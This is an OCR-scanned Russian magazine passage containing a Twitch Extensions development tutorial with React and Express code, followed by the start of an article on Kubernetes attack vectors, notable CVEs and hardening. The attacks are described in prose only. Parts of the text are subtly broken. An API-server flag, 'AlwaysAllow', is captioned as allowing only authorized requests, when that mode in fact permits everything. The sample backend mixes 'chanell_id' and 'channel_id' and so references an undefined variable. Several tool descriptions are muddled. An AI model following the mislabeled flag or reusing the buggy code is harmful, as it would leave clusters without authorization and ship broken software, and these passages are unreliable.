говой платформы Twitch предста вили новый
способ взаимодействия стримеров и зри‐
телей — Twitch Extensions. Эта система поз‐
воляет раз работ чикам дополнять и улуч‐         Михаил Киреев                                                                                           kireevmp@yandex.ru
шать интерфейс как сайта, так и мобиль‐
ного  приложения,  создавая  различные
интерактивные  элементы.  Я  расска жу,
как  работают  эти  расширения  и  как
при желании создать свое.





                        Структура расширений


БЭКЕНД
Самое важное — интерактивность и налаженное взаимодействие между
пользователями и стримером. Для это го нам понадобится хороший сервер.
   У расширений Twitch такой сервер называ ется Extension Backend Ser-
vice (EBS). В отличие от фронтенда, ответственность за непрерывную работу
которого берет на себя Twitch, хостинг и раз мещение EBS стриминговым
сервисом не обеспечивается — а зна чит, эту проб лему нам нужно решать
самостоятельно.
   Бэк состоит из нескольких частей.
 1. Общение с поль зователями и верификация JWT. Twitch для каждого
   человека, который активирует рас ширение, генерирует уникальный токен
   JWT, подписанный секретным ключом. Это поз воляет идентифицировать
   пользователя, не раскрывая его персональных данных, и отделять нас‐
   тоящих зрителей от ботов, спама и DDoS.
 2. Обработка действий пользователей внут ри рас ширения. Это может быть,
   например, подсчет голосов зрителей или работа с базой данных.
 3. Взаимодействие с Twitch API и в первую очередь с PubSub — сервисом,
   который позволя ет фрон тенду и бэкенду общаться без задержек.

Здесь мы используем популярное и надеж ное решение — ExpressJS.
Для хостинга бэкенда можно использовать любой сервис, даже собственный
компьютер. Для небольших раз работок нам пригодится сервис Heroku,
который, помимо хостинга, предоставит удо бова римый URL.


ФРОНТЕНД
Фронтенд каждого расширения состоит из одного или нескольких экранов
(view), они бывают разных типов и вмес те составляют пользовательский
интерфейс.
 • Mobile extension — специальный блок, предназначенный для показа
   внутри официального приложения Twitch с помощью WebView.
 • Video-overlay extension — виджет, который накладывается поверх все‐
   го видео (максимум на один стрим).
 • Video-component extension — блок, который занимает лишь часть
   видеопотока. Стример может рас положить его на свое усмотрение.
 • Panel extension — полностью настра иваемая панель, которая отобража‐
   ется не поверх видео, а внизу, вмес те с другими панелями.

Кроме различных view, предназна ченных для зрителей, есть также два view
для самого стримера, которые нужны для управления расширением.
 • Live-config (Live Dashboard) — настройки, доступные в прямом эфире,
   прямо в дашборде — там же, где и все остальные самые необходимые
   элементы управления.
 • Config   (Conﬁguration) —  параметры,  которые   устанавливаются
   при инсталляции расширения (или в отдельном меню всех рас ширений).





                         Все типы view

На самом деле каждый из этих view — это не более чем специально офор‐
мленный тег <iframe> или отдель ный WebView (для телефонов), который
занимается отображением своего интерфей са и обработкой действий поль‐
зователя. Именно поэто му, чтобы упростить разработку фронтенда, мы
используем React.


РАЗРАБОТКА СВОЕГО РАСШИРЕНИЯ
Теперь давай я на при мере покажу, как написать основу для собственного
расширения. Пусть это будет онлайновое голосо вание с обновлением
голосов в реальном времени.
   Упростить разработку расширений для Twitch помогает спе циальное при‐
ложение, которое работает в Windows, macOS или Linux. Оно называется
Twitch Developer Rig и нужно исключительно для создания и тестирования
расширений.


Developer Rig
При запуске программа предложит тебе войти через свой аккаунт на Twitch,
и только после этого можно начинать работу.





                Создание расширения — шаг первый

Здесь нужно выбрать для сво его рас ширения уникальное имя, которое
не только не исполь зуется сейчас, а вообще никогда никем не исполь‐
зовалось.





                Создание расширения — шаг второй

На этом шаге нам предлагают выбрать папку, где будет располагаться про‐
ект, и основу для проекта.
   Если ты выберешь какой‐либо базовый код, то он будет клонирован с офи‐
циального репозитория Twitch на GitHub.


Фронт
Для работы расширения Twitch предос тавляет специальный пользователь‐
ский интерфейс, который доступен в коде стра ницы через объ ект window.
Twitch.ext. Этот интерфейс исполь зуется в первую оче редь для управления
событиями.
  Ключевое событие — это, конечно, появление пользовате ля. Оно называ‐
ется onAuthorized() и получа ет данные юзера: его токен (со всеми правами
доступа — стример или зритель) и идентифика тор.
  Другое важное событие, onContext(), передает расширению данные
об окружении во время инициализации (например, какой используется бра‐
узер).
  Кроме того, API предос тавляет воз можность подписаться на события
Twitch PubSub.
  Создадим основу клиентского приложения — video_component.


import React from 'react';


export class App extends React.Component {
  constructor() {
    super();
    this.twitch = window.Twitch.ext;
    this.state = {
      active: false,
      poll: [],
    };


    this.twitch.onAuthorized(this.authorize);
  }


  async authorize({ token, userId }) {
    this.token = token;
    this.userId = userId;


    const result = await fetch(`${host}/poll`, {
      headers: {
        Authorization: `Bearer ${this.token}`,
      },
      method: 'GET'
    });
    this.setState(result);
  }


  render() {
    const {
      active,
      poll,
    } = this.state;


    return (
      <>
        /* код отображения */
      </>
    );
  }
}

Код, который будет отоб ражать ся у стримера в панели (config):


import React from 'react';


export class App extends React.Component {
  constructor() {
    super();
    this.twitch = window.Twitch.ext; // Сохраним для быстрого доступа
    this.state = {
      active: false,
      poll: [],
      role: null,
    }; // Пустое состояние — новое будет загружено с сервера


    this.twitch.onAuthorized(this.authorize);
  }


  async authorize({ token, userId }) {
    this.token = token;
    this.userId = userId;
    // Получаем токен из данных от Twitch


    const {
      role,
    } = await jwt.decode(token);
    // Проверяем роль пользователя (на всякий случай)


    const result = await fetch(`${host}/poll`, {
      headers: {
        Authorization: `Bearer ${this.token}`,
      },
      method: 'GET',
    });
    // Запрашиваем актуальные данные


    this.setState({
      ...result,
      role,
    });
  }


  render() {
    const {
      active,
      poll,
      role
    } = this.state;


    if (role !== 'broadcaster') {
      /*
       * Проверка, является пользователь
       * настоящим стримером или нет
       */
      return null;
    }


    return (
      <>
        /* код отображения */
      </>
    );
  }
}


Бэк
Основная задача нашего бэкенда — хра нить и распространять опросы, соз‐
данные стримерами, и собирать голоса пользователей, для чего пригодится
база данных, например MongoDB. Кроме этого, стоит обратить внимание
на обработку заголовков CORS, так как запросы будут идти от име ни сервера
Twitch.


import express from 'express';
import jwt from 'jsonwebtoken';
import cors from 'cors';


const app = express();


var polls = []; // Маленькая база данных


function getPoll(chanell_id) {
  /*
   * Получить опрос из базы данных
   * или из переменной (ради простоты)
   */
  const poll = polls[chanell_id];
  if (poll) {
    return poll;
  } else {
    // Стример не активировал опрос
    // Возвращаем пустые данные
    return {
      active: false,
      poll: [],
    };
  }
}


/*
 * Здесь можно связываться с базой данных
 * и обновлять данные
 */
function setPoll(channel_id, poll) {
  polls[channel_id] = poll;
}


function deletePoll(channel_id) {
  polls[channel_id] = null;
}


function votePoll(channel_id, vote) {
  if (polls[chanell_id] && polls[channel_id].poll[vote]) {
    polls[channel_id].poll[vote].votes += 1;
  }
}


app.use(express.json());
app.use(cors()); // CORS‐заголовки


app.use(async (req, res, next) => {
  const auth = req.get('Authorization');


  if (!auth.startsWith('Bearer ')) {
    res.sendStatus(403);
    // Данные авторизации не были предоставлены
    return;
  }


  const token = auth.slice(7); // Пропускаем 'Bearer '
  try {
    req.user = await jwt.verify(token, Buffer.from(process.env.SECRET
, 'base64'));
  } catch (e) {
    res.sendStatus(403);
    // Неверный или истекший токен
    return;
  }


  next();
})


// Разрешаем всем пользоваться нашим расширением
app.options('/poll', cors());


app.get('/poll', (req, res) => {
  const {
    chanell_id
  } = req.user;


  const poll = getPoll(chanell_id);


  res.json(poll);
});


app.post('/poll', (req, res) => {
  const {
    chanell_id,
    role,
  } = req.user;


  if (role !== 'broadcaster') {
    res.sendStatus(403);
    // Пользователь — не владелец канала
    return;
  }


  setPoll(chanell_id, req.body);


  res.sendStatus(200);
});



app.delete('/poll', (req, res) => {
  const {
    channel_id,
    role,
  } = req.user;


  if (role !== 'broadcaster') {
    res.sendStatus(403);
    // Пользователь — не владелец канала
    return;
  }


  deletePoll(channel_id);


  res.sendStatus(200);
});


app.post('/vote', (req, res) => {
  const {
    channel_id,
  } = req.user;


  votePoll(channel_id, req.body.vote);


  res.sendStatus(200);
});


app.listen(process.env.PORT || 8080);

Теперь, когда есть все сос тавные части, дело за малым — запустить это!


Раз верты вание и пуб ликация расширения
В первую оче редь нам необходим работа ющий бэкенд. Соз дадим в папке
с файлом, содержащим код сервера, репози торий Git и файл package.json
(с помощью npm init). При инициализации укажи в качестве точки входа (en‐
try point) свой файл.
  Затем необходимо закоммитить изменения, соз дать приложение Heroku
и запустить его.



  $ git init
  Инициализирован пустой репозиторий Git в backend/.git/
  $ npm init ‐y
  Wrote to backend/package.json:
  {
  "name": "backend",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
  "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC"
  }
  $ heroku create miracles‐polls
  Creating ⬢ miracles‐polls... done
  https://miracles‐polls.herokuapp.com/ | https://git.heroku.com/miracles‐
  polls.git
  $ git add .
  $ git commit ‐m "Version 1.0"
  $ git push heroku master
  remote: Compressing source files... done.
  remote: Building source:
  remote: ‐> Node.js app detected
  ...
  remote: ‐> Build succeeded!
  remote: ‐> Compressing...
  remote:    Done: 19.9M
  remote: ‐> Launching...
  remote:    Released v3
  remote:    https://miracles‐polls.herokuapp.com/ deployed to Heroku
  remote: Verifying deploy... done.


Так, наш сервер запущен и уже ждет новые опросы. Займемся фронтендом.
  Для улучшения качества загрузки хос тинг этой час ти Twitch целиком берет
на себя, поэтому, чтобы наше рас ширение стало дос тупно, нужно зайти в кон‐
соль разработчика расширений, в раз дел управления твоим рас ширением,
выбрать версию (у нас пока она одна), затем открыть вкладку Go to Files.





                 Вкладка загрузки файлов в Twitch CDN





              Загрузка файлов и история пос ледних файлов

Кроме загрузки файлов, в других вкладках можно настроить параметры отоб‐
ражения  (например,  раз меры  video‐component  или  типы  видов  рас‐
ширения), управлять версиями рас ширения, а также включить монетизацию.





                     Нас трой ки рас ширения


ВЫВОДЫ
Как видишь, расширения — мощнейший инс трумент, который в корне меня ет
способ взаимодействия стримера со зрителями. Twitch Extensions поз воляет
устраивать небывалые интерактивные трансляции и шоу, и я показал тебе
лишь самую вершину айсбер га. Это новое направление, где только начали
появляться стоящие проекты. Теперь и ты тоже можешь поучас твовать в этом.



        WWW

                     Для дальнейшего изучения и разработки рас‐
                     ширений ты можешь почитать официальный гайд
                      или справку по всем методам.
АДМИН





                                       Иван Пискунов
 НЕПРОБИВАЕМЫЙ
 DEVOPS-КЛАСТЕР

     НАСТРАИВАЕМ И УСИЛИВАЕМ
     БЕЗОПАCНОСТЬ KUBERNETES





Самое известное средство кон тейнеризации и автомати‐
зации развертывания приложений — Docker. Известное,
но не единственное: достойную конкуренцию ему составляет
Kubernetes. Разумеется, он тоже представляет определен‐
ный интерес для зло умыш ленников. Как защитить Kubernetes
от взлома и сетевых атак? Об этом — сегодняшняя статья.


В прошлой статье я расска зал о том, как проверить текущий уровень
защищенности очень популярной в DevOps‐среде системы контейнеризации
Docker и как повысить этот самый уро вень. Сегодня мы продолжим изучать
вопросы безопасности DevOps‐инфраструктуры, и у нас под прицелом сис‐
тема контейнерной оркес тра ции на базе Kubernetes. Мы раз берем основные
векторы атак, изучим нашумевшие уяз вимости, а также соберем набор инс‐
трументов, необходимый для обеспечения безопасности кластера на Kuber‐
netes. Приступим!


О KUBERNETES В ДВУХ СЛОВАХ
Я думаю, каждый, кто хотя бы однажды сталкивался с миром DevOps, имеет
общее представление о  том,  что  такое  Kubernetes.  Если  кратко,  то
это довольно популярная система контейнерной оркес трации  (правда,
к музыке и оркестрам она не имеет ни малейшего отношения). На чем осно‐
вывается популярность Kubernetes и чем он так хорош?
   Kubernetes, или, сокращенно, K8s, — сис тема автоматизации разверты‐
вания и масштабирования контейнеризированных приложе ний и управле ния
ими, реализованная на базе открытого программного обес печения. Проект
был основан в 2014 году. Оригинальная версия некогда разрабаты валась
в недрах самой Google для внутренних нужд корпорации, но впоследствии
была передана под управление опенсорсно му фонду Cloud Native Computing
Foundation, откуда и попала в широкие массы.
  Изначально K8s задумывалась как система‐менеджер для управления
кластерами  из  контейнеров.  Сис тема  динамическая,  она  реагирует
на события в режиме реального времени и поз воляет поднять сервис,
который будет просто работать без танцев с бубном и масштабироваться
по запросу. Гибко, быстро, эко номичес ки эффективно — именно то, что нуж‐
но разработчикам!





          Архитектура системы контейнерной оркес трации K8s

В практике администрирования Kubernetes используется понятие подов
(pods). Каждый под — это группа объединенных общей задачей контейнеров
(к примеру, на том же Docker), которые могут быть и микросервисом, и мас‐
сивным приложе нием, раз несенным на нес коль ко параллельно работающих
машин. Kubernetes призван решать проб лемы с эффективным распределе‐
нием выполнения контейнеров по узлам кластера в зависи мости от изме‐
нения  нагрузки и  текущей  потребности  в сервисах. Ины ми  словами,
перед нами — система гибкого управления инфраструктурой контей нериза‐
ции с возможностью балансировки нагрузки.
  Давай перечислим основные техничес кие задачи, которые можно решить
с помощью Kubernetes:
 • запуск большого числа контейнеров Docker или Rocket на большом
   количестве хостов;
 • мониторинг состояния run‐time‐среды и своевременное реагирование
   на изме нения;
 • управление запущенными контейнерами, обеспечение их совместного
   размещения и межконтейнерной репликации;
 • масштабирование и балансировка большого количества хостов в пре‐
   делах кластера.

Сегодня K8s стал неким стандартом для современных DevOps‐сред как в
больших компаниях,  так и среди стартапов. Он активно используется
в облачных сервисах вро де AWS, Microsoft Azure или Google Cloud.
  По своей сути Kubernetes представляет собой один из стратеги ческих
компонентов все го DevOps‐процесса, именно поэто му атаки на него всегда
были и остаются актуальными. Ведь, взломав эту систему, хакер получит дос‐
туп ко всем нодам и контейнерам, запущенным внут ри K8s, а это уже прямой
путь и к компрометации или утечке конфиденциальных данных.
  Самое печальное, что в сети до сих пор пол но публичных K8s‐серверов,
доступ к которым можно получить из интернета. Как? Широко известен, нап‐
ример, замечательный сервис Shodan, который поз воляет искать уязвимые
версии ПО, доступные из интернета и «готовые к атаке». От таких незакрытых
уязвимостей в свое время пос тра дали десятки тысяч публичных баз Mon‐
goDB. Если ты захочешь проверить, как работа ет Shodan на практике,
это можно сделать при помощи поискового скрипта, выложенного на GitHub.





      Результат поиска публичных сервисов K8s с помощью Shodan


ОБЗОР ОСНОВНЫХ ВЕКТОРОВ АТАК НА KUBERNETES
Как мы выяснили чуть рань ше, K8s имеет доволь но сложную архитектуру
и использует в своем сос таве множес тво компонентов. Потому векторы
и типы атак на эту систему тоже разнятся. Итак, общая площадь атак включает
в себя:
 • Master Node — главный мас тер‐сервер, который управляет всем клас‐
   тером рабочих узлов (подов) и раз верты ванием модулей на этих узлах;
 • Worker Node — рабочие серверы, на которых запус кают контейнеры
   приложений и другие компоненты Kubernetes, к примеру такие, как K8s‐
   агенты и прокси‐серверы;
 • Pods — это неделимая элементарная еди ница развертывания и адре‐
   сации в Kubernetes. Под имеет собственный IP‐адрес и может содержать
   один или несколь ко контейнеров;
 • Services — сетевые служ бы, обеспечивающие обмен данными внутри
   кластера, балансировку, репликацию, обрабатывающие запросы и так
   далее;
 • System Components — ключевые сис темные компоненты, которые
   используются для управления кластером Kubernetes: сервер API, Kubelet
   и другие.





                     Типовые векторы атак на K8s


Проб лемы безопасности K8s
Как и в любой сложной системе, придуманной людьми, в инфраструктуре
кластера K8s имеются типичные проблемы безопас ности, с которыми часто
сталкиваются системные администра торы. Ниже я перечис лю самые извес‐
тные из них.
 • Explosion of East-West Traffic, или атака «Взрыв трафика Восток —
   Запад». Суть этой атаки заключа ется в том, что контейнеры могут быть
  динамически развернуты в нес кольких незави симых друг от друга облаках,
   что значительно увеличивает трафик обмена данными внутри логического
   кластера. Это похоже на перегон поездов по желез ной дороге, и именно
   поэтому данный вид атак получил наз вание «С востока на запад». Удален‐
   ное расположение контейнеров может исполь зоваться злоумышленни‐
   ками, например, для реализации DDoS‐атак.





        Схематичное описание атаки Explosion of East‐West Traﬃc

 • Increased Attack Surface (увеличенная площадь атаки). Проблема
   основывается на том, что каждый контей нер может иметь раз личную
   поверхность  атаки и собственные  уни кальные  уязвимости,  которые
   используются хакерами для дальнейшего взлома. К при меру, могут
   использоваться уязвимости для Docker или системы авторизации AWS.
 • Container compromise (компромета ция контейнера). Суть атаки кроется
   в  использовании  неверной  конфигурации  (security  misconﬁguration)
   для всех контейнеров клас тера, которые косвенным образом способству‐
   ют компрометации или же включают в себя уязвимос ти приложений.
  К компрометациям контейнера относятся манипуляции внутренней ком‐
   мутацией, управле нием процессами или дос тупом к файловой сис теме.
 • Unauthorized  connections  between  pods  (несанкционированные
   соединения между подами внутри единого клас тера). Скомпрометирован‐
  ные контейнеры могут соединяться с дру гими контейнерами на том же
   или на других хостах, чтобы запустить какую‐либо атаку. Несмотря на то
   что фильтрация на уровне L3 (ACL‐листы) обеспечивается сетевым обо‐
   рудованием согласно настроенным правилам, некоторые неавторизован‐
  ные обращения могут быть обна ружены только с помощью фильтрации
   на седьмом уровне модели OSI.





     Некоторые нашумевшие кейсы, связанные с безопасностью K8s


Примеры критических багов
Лю бой прикладной и сис темный софт имеет ряд критических уязвимостей,
и K8s не исключение. Наличие подобных багов ставит под угрозу весь клас‐
тер, от запущенных контейнеров в целом до конкретных данных, хранящихся
внутри БД на каком‐либо отдельном поде.
  По статистике, соб ранной из реестра уязвимостей NIST, больше всего
критических ошибок было обна ружено в 2018 году — восемь штук, и четыре
уязвимости найдены уже в текущем году. Ниже я расскажу о самых громких
багах, наделавших много шуму среди разработчиков, которые использовали
Kubernetes.





              Статистика уяз вимостей K8s из реес тра NIST

Первая уяз вимость получила номер CVE‐2019‐5736. Об этом баге, обна‐
руженном в текущем году, мы уже писали на стра ницах нашего журнала. Он
позволяет вредоносному контейнеру перезаписать исполняемый файл runC
на хост‐системе, при этом никакого вза имодействия с пользователем не тре‐
буется. В результате подобной ата ки злоумышленник может получить root‐
доступ к хосту и возможность исполнять на нем произвольный код. В фев‐
рале 2019 года эксплоит для CVE‐2019‐5736 был опубликован на GitHub.
  Еще один баг, выявленный в марте 2019 года, имеет идентификатор
CVE‐2019‐11246. Он позволяет  атакующему доставлять файлы из пода
на компьютер оператора или модифицировать их с помощью подмены tar bi‐
nary, используя обычную внутреннюю команду kubectl cp.





           Схе матич ное описание уяз вимос ти CVE‐2019‐11246

Дру гой прош логод ний баг — CVE‐2018‐1002105 связан с эскалацией
привилегий. Он позволяет ата кующему повысить при вилегии в кластере
и получить к нему доступ из‐за логической ошиб ки обработки API‐вызовов.
Эксперты по безопасности оценили уяз вимость в 9,8 балла по шкале CVSS,
поскольку брешь не требует предварительной аутентификации и проста
в эксплуатации. Несанкционированный доступ открывается после отправки
специфического запроса к API‐серверу Kubernetes. Все уязвимые сборки Ku‐
bernetes некорректно обрабатывают вредоносный запрос, позволяя обра‐
титься к бэкенду с исполь зованием учет ных данных TLS, прописанных в нас‐
тройках API‐сервера. Через нес колько дней после обнаруже ния проблемы
PoC‐эксплоит был опубликован на GitHub. Поз же выпустили патч, закрыва‐
ющий эту уязвимость.





          Схематич ное описание уязвимос ти CVE‐2018‐1002105

Вот общий сценарий действий хакеров при исполь зовании уязвимости CVE‐
2018‐1002105.
 1. Определение локации в ИТ‐ландшафте, где запущен K8s.
 2. Эксплуатация известных уяз вимостей облачных провайдеров.
 3. Запуск команд внутри контейнера.
 4. Доступ к файловой системе node.
 5. Разведка во внутренней сети, горизонтальное рас ширение и закрепление
   внутри взломанных систем.

Еще один громкий кейс, связанный с K8s, имел место в 2018 году. Речь
идет о взломе аккаунта всем извес тной компании Tesla в облаке Amazon Web
Services. Как позже выяснили эксперты, учетные данные в одном из подов Ku‐
bernetes открыли доступ к среде AWS Tesla, которая содержала корзину Ama‐
zon S3. В ней, в свою очередь, хранились конфиденциальные данные, в том
числе телеметрия. Однако вместо кра жи этих данных хакеры начали майнить
криптовалюту на одном из подов Tesla.





     Пошаговый сценарий взлома AWS облака Tesla c целью майнинга


             INFO

                     Хороший и доступный каждому админу бенчмарк
                      проверки безопасности K8s — набор CIS Kuber‐
                         netes Benchmark, который можно бесплатно заб‐
                        рать  с официального сайта CIS или  GitHub‐
                      репозитория. Набор включает список рекомен‐
                      дуемых требований безопасности, чек‐лист про‐
                       верки и скрип ты для автоматического ана лиза
                       текущих конфигура ций K8s.



УСИЛИВАЕМ БЕЗОПАСНОСТЬ KUBERNETES
Обеспечение безопасности Kubernetes условно можно представить двумя
практическими подходами. Первый подход — это настройка опций безопас‐
ности (security hardening) и использование лучших практик (security best prac‐
tices) на всех ключевых элементах K8s‐инфраструктуры. Второй подход —
применение сторонних утилит с откры тыми исходниками и коммерческих
решений для обеспечения мониторинга, контроля и управле ния уровнем
безопасности.
   Начну с общих рекомендаций и советов, как усилить безопасность Kuber‐
netes, которыми в состоянии воспользоваться любой DevOps‐администра‐
тор.
 1. Повсеместное  использование шифрования TLS . Для  каждого
   инфраструктурного компонента K8s, поддержи вающего протокол TLS, он
   должен быть вклю чен. Это гарантиру ет защиту от сниффинга трафика,
  форсирование удостоверения идентичности сервера и (в слу чае Mutual
   TLS) удостоверения идентичнос ти клиента.
 2. RBAC-ориентирован ная модель доступа и минимально  воз-
  можные привиле гии. Управление дос тупом на основе ролей (Role‐
   based access control, RBAC) обеспечива ет тонкое управление политиками,
   с использованием которых пользователи получают доступ к таким ресур‐
   сам, как пространства имен.
 3. Сто рон няя аутен тификация для API server . Централизация аутен‐
   тификации и авторизации для всей компании, к примеру на базе LDAP
   и Single Sign On, помогает выдавать и отзы вать права для сотрудни ков
   предприятия.
 4. Инкапсу ляция кластера etcd за сетевым экраном. Пос кольку клас‐
   тер etcd хранит информацию о сос тоянии Kubernetes и секретах дос тупа
   (токены, сертификаты), он является критичным компонентом K8s. Именно
   поэтому etcd дол жен быть защищен отдельно от остального клас тера, луч‐
  ше за файрволом и изолированной VPC.
 5. Систематическая  ротация  ключей шифрования.  Регулярная
   ротация (по сроку и событию) ключей безопас ности и сертификатов —
   одна из лучших практик в обеспечении безопасности любой ИТ‐сис темы.
  Она позволяет ограничить «радиус поражения» при компрометации ключа
   доступа.
 6. Ре гулярный статический анализ YAML-файлов кон фигурации.
   Конфиденциальная информация, продеклариро ванная в YAML‐формате,
   не должна храниться в открытом виде на подах. А конфиденциальные кон‐
   фигурации и  секреты доступа  (пароли) должны быть зашифрованы
   с помощью таких инстру ментов, как git‐crypt. Статический анализ кон‐
   фигурации YAML может использовать ся для уста новления базовых показа‐
   телей безопасности, причем про водить такой ана лиз следует регулярно.
 7. Ограниче ния на запуск кон тейнеров под учетной записью root.
   Зачастую у контейнеров, которые запускаются с правами суперполь‐
   зователя root, намного больше прав, чем того тре буют их рабочие наг‐
   рузки,  что  в  случае компрометации помогает  атакующим  получить
  еще больше возможнос тей.
 8. Обязательные сетевые политики. По умолчанию сеть в Kubernetes
   разрешает весь тра фик между подами без каких‐либо ограничений. Эту
   настройку можно ограничить сетевой полити кой — NetworkPolicy.
 9. Не кото рые коман ды для форсирования безопасности на эле-
  мен тах K8s-инфраструк туры. Чтобы повысить безопас ность сетевой
   инфраструктуры в Kubernetes, мож но использовать специальный набор
   команд, которые я привожу ниже.


Для API-сервера:
// Отключение анонимного доступа
 ‐‐anonymous‐auth=false


// Разрешение только авторизованных запросов
  ‐‐authorizationmode AlwaysAllow


// Форсирование ограничений прав на kubelets, включая NodeRe
striction на API server
  ‐‐admission‐control


// Форсирование использования RBAC‐модели доступа к объектам K8s
 ‐‐authorization‐mode=RBAC


// Отключение небезопасных портов
 ‐‐insecure‐port=0


Для etcd-сервера:
// Форсирование использования защищенного HTTPS connections к
серверу etcd
 ‐‐cert‐file and ‐‐key‐file


 // Включение принудительной авторизации при обращении к etcd
 ‐‐client‐cert‐auth=true


 // Использование только подписанных сертификатов
 ‐‐trusted‐ca‐file


 // Отключение использования автоподписанных сертификатов
  ‐‐auto‐tls=false


 // Использование только безопасных методов подключения
 ‐‐peer‐client‐cert‐auth=true
 ‐‐peer‐autotls=false and specify ‐‐peer‐cert‐file, ‐‐peer‐key‐file


 // Запуск etcd в защищенном исполнении
 ‐‐peer‐trusted‐ca‐file


 // Форсирование авторизации с использованием сертификатов для
API‐сервера
 ‐‐etcd‐cafile


Ре комен дуемые шаги для усиления безопасности перед раз -
верты ванием K8s-кластера
 • Используй на всю катушку пространс тва имен (namespaces).
 • Форсируй SELinux (хотя бы в продакшен‐среде!).
 • Используй Seccomp.
 • Используй Cgroups.
 • Используй минимальное количество запущенных хостов.
 • Не забывай про уста новку обновлений и патчей (обновления ядра, биб‐
   лиотек и так далее).
 • Периодически запускай тес ты безопасности CIS Benchmark для контроля
   состояния защищен ности.


           WARNING

                    Перед любыми операциями кон фигурирова ния
                      не забывай сделать бэкап конфига! Докумен‐
                       тируй все изменения, что бы потом не потерять
                         лог изменений и не вырвать себе с досады
                      волосы на затылке.





                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
   НЕПРОБИВАЕМЫЙ
     DEVOPS-КЛАСТЕР
                     НАСТРАИВАЕМ И УСИЛИВАЕМ
                    БЕЗОПАCНОСТЬ KUBERNETES





Утилиты для аудита безопасности
Аудит безопасности Kubernetes для эффектив ной комплексной оценки дол‐
жен включать в себя несколько следующих областей:
 • безопасность конечных хостов (Host security);
 • безопасность мастер‐ноды и API‐сервера Kubernetes (Master node Kuber‐
   netes security);
 • безопасность демонов Docker (Docker daemon security);
 • контейнерную безопасность (Container security);
 • правила  использования  модели  RBAC‐доступа  (Properly  conﬁgured
   RBACs);
 • безопасность хранимых и переда ваемых данных (Securing data at rest
   and in transit).

Утилитка‐сканер kube‐bench — это шустрое при ложение, написанное на Go,
которое проверяет, насколько безопас но раз вернут Kubernetes. Для этого
kube‐bench прогоняет все проверки, описанные в тесте CIS Kubernetes. Тес‐
ты настраиваются с помощью файлов YAML, что позволяет легко обновлять их
по мере развития спецификаций.





             Результат ска нирования утилитой kube‐bench

Примеры использования некоторых команд ути литы kube‐bench:


// Запуск утилиты в автоматическом режиме (автопоиск мастер‐ноды)
# kube‐bench master


// Запуск тестов безопасности CIS Kubernetes
# kube‐bench node ‐‐version 1.13


// Запуск утилиты внутри контейнера
# docker run ‐‐pid=host ‐v /etc:/etc:ro ‐v /var:/var:ro ‐t aquasec/
kube‐bench:latest [master|node] ‐‐version 1.13

Еще одна утилита — Kubeaudit — это инстру мент командной строки для ауди‐
та кластеров Kubernetes на предмет различных проблем безопас ности. Под‐
держивает проверку множес тва опций, к примеру таких, как запуск контей‐
неров под учетной записью root, хра нение секретов доступа (токены, сер‐
тификаты), возможность записи в корневую директорию.
  Для установки утилиты в систему используй следующие команды:


# go get ‐v github.com/Shopify/kubeaudit
# make
# make install

Запустить все имеющиеся тес ты в пос ледова тельном режиме можно так:


# kubeaudit all

Для проверки безопасности для сервисных акка унтов предус мотрена вот
такая команда:


# kubeaudit sat сервиск акунт

А эта команда предназначена для проверки безопас ного использования при‐
вилегий:


# kubeaudit priv





             Результат ска нирования утилитой Kubeaudit

Kubesec — инструмент управления секретами дос тупа для Kubernetes с под‐
держкой таких сервисов, как GPG, Google Cloud KMS и AWS KMS backends.
Служба оценивает, насколько ресурсы Kubernetes используют возможности
для  повышения  безопасности.  Поль зователь  получает  рекомендации,
как повысить общую безопасность системы. Пос мотреть вживую, как работа‐
ет эта утилита, можно на демонстрационном видеоролике.


Ле гитимность используемых образов
Легитимность использования обра зов для развертывания контейнеров —
один из клю чевых критериев безопас ности. Но эта фича относится скорее
к Docker, чем к Kubernetes, поэто му я расска жу об используемых для этого
инструментах очень кратко. Более подробную информацию ты можешь найти
в нашей статье по бе зопас ности Docker.
    Clair — это проект с открытым исходным кодом для статического анализа
уязвимостей в контейнерах appc и docker. Данные об уязвимостях пос тоянно
импортируются из извес тных источников и соотносятся с индексированным
содержимым образов контейнера, чтобы сформировать списки уязвимостей,
угрожающих каждому кон тейнеру в отдельнос ти.





               Архитектура ска нера уяз вимос тей Clair

Еще одна похожая утилита носит название Dagda. Это инстру мент для ста‐
тического анализа извес тных уяз вимос тей, поиска троянов, вирусов, вре‐
доносных программ, а также других угроз в образах и контейнерах Docker.
Кроме того, Dagda используется для мониторинга сетевых служб Docker
и запуска контейнеров в целях обна ружения аномаль ных действий. Проверка
зависимостей основана на проектах OWASP и Retire.js для анализа безопас‐
ности таких слоев, как Java, Python, Node.js, JS, Ruby, PHP.





               Архитектура ска нера уяз вимос тей Dagda

Trivy — простой и комплексный ска нер уязвимос тей для контейнеров, под‐
держивающий командную стро ку. Trivy обна ружи вает уязвимости програм‐
мных пакетов ОС (Alpine, RHEL, CentOS и дру гих) и зависимостей при ложе ний
(Bundler, Composer, npm, yarn и так далее).





                       Запуск утилиты Trivy


Бе зопасность эксплу атации
Для того чтобы обеспечить безопас ную экс плуатацию Kubernetes, был при‐
думан целый арсенал специальных утилит. Одна из них называется Falco.
Это крутецкий опенсорсный сканер от Sysdig Secure для обнаружения втор‐
жений и проблем безопас ности на платформах Cloud Native, таких как Kuber‐
netes, Mesosphere и Cloud Foundry. Falco умеет искать аномалии, нетипичное
поведение и предупреждает админа через Slack, Fluentd, NATS, а также дру‐
гие мессенджеры.





                   Дашборд сканера Falco

Cilium — сервис, обеспечивающий фильтрацию сетевой активности с учетом
API‐вызовов в контейнерной инфраструктуре на базе Linux, в частнос ти
в Docker и Kubernetes. Используя новую технологию ядра Linux под названи‐
ем BPF (Berkeley Packet Filter), Cilium предоставляет простой и эффективный
способ определять и применять полити ки безопас ности как сетевого уровня,
так и уровня приложений на основе идентификатора контейнера или модуля.





                       Архитектура Cilium

Vault — сервис от всем извес тной компании HashiCorp. Он поз воляет хранить
и строго контролировать доступ к токенам, паролям, сертификатам, ключам
шифрования для защиты секретов и дру гих конфиденциальных данных
из пользовательского интерфейса, CLI‐строки или с помощью API‐вызовов
по протоколу HTTP.





                    Архитектура HashiCorp Vault


Бе зопасность сетево го взаимо действия
Решение Calico обеспечивает безопас ное сетевое взаимодействие между
контейнерами и виртуальными машинами в одном кластере. По сути, Сalico
представ ляет собой софтовый свитч (Softswitch), который создает сеть треть‐
его уровня и управляет ею, наз начая каж дому инстансу полностью маршру‐
